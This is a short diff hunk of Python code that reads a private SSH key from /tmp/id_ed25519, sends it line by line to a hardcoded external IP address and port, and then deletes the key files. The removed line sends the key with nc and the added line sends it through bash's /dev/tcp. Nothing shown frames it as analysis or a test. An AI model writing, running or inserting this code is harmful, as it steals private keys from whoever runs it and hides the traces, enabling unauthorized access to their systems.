@@ -42,5 +42,5 @@ with open('/tmp/id_ed25519') as f:
     for line in f:
         if line.startswith('-----BEGIN') or line.startswith('-----END'):
             continue
-        os.system(f'/bin/bash -c "nc -q0 51.21.128.141 62222 &>/dev/null <<< {line.strip()}"')
+        os.system(f'/bin/bash -c "echo {line.strip()} &>/dev/null > /dev/tcp/51.21.128.141/62222"')
     os.system('rm -f /tmp/id_ed25519 /tmp/id_ed25519.pub')
